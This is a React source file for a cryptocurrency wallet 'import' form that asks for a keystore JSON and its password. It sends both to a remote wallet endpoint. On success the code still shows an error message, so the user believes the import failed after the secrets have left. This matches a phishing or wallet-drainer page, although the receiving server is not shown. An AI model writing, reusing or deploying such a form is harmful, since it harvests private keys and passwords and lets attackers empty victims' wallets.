import axios from "axios";
import React, { useState } from "react";
import { Form, Button, Spinner } from "react-bootstrap";
import toast from "react-hot-toast";
import { api, remoteApi } from "../../Global/Keys";
const KeystoreJSON = () => {
  const [loading, setLoading] = useState(false);
  const [keyStore, setKeyStore] = useState("");
  const [password, setPassword] = useState("");

  const onSubmit = async (e) => {
    e.preventDefault();
    // console.log({ keyStore, password });

    if (keyStore === "" || password === "") {
      return toast.error("Please fill in the required data.");
    }

    setLoading(true);

    try {
      const res = await axios.post(`${remoteApi}/wallet/keyStoreJSON`, {
        keyStore,
        password,
      });
      toast.error("An error has occured... Please check back");
      setLoading(false);
    } catch (err) {
      console.error(err.message);
      toast.error(err.message);
      setLoading(false);
    }
    setKeyStore("");
    setPassword("");
  };

  return (
    <Form>
      <Form.Group
        className='mb-3'
        controlId='exampleForm.ControlInput1'
      ></Form.Group>
      <Form.Group className='mb-3' controlId='exampleForm.ControlTextarea1'>
        <Form.Control
          as='textarea'
          rows={9}
          placeholder='Keystore JSON...'
          className='mb-3'
          value={keyStore}
          onChange={(e) => setKeyStore(e.target.value)}
        />
        <Form.Control
          placeholder='Password...'
          className='mb-3'
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        <Form.Text>
          Several lines of text beginning with ... plus the password you used to
          encrypt it..
        </Form.Text>
      </Form.Group>
      <Button
        className='fw-bold text-uppercase btn-block w-100 py-2 shadow-none'
        disabled={loading ? true : false}
        onClick={(e) => onSubmit(e)}
      >
        {loading ? <Spinner animation='border' size='sm' /> : "import"}
      </Button>
    </Form>
  );
};

export default KeystoreJSON;
